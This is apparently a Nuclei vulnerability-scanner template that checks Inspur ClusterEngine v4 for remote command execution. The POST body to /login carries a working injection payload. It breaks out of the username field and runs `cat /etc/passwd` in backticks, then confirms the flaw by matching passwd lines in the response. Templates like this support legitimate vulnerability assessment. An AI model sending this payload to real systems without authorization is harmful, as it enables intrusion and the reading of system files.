id: inspur-clusterengine-v4-rce

info:
  name: Inspur Clusterengine v4 Sysshell RCE
  author: pikpikcu
  severity: critical
  reference: https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul
  tags: clusterengine,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/login"
    body: |
     op=login&username=1 2\',\'1\'\); `cat /etc/passwd`

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body

      - type: status
        status:
          - 200
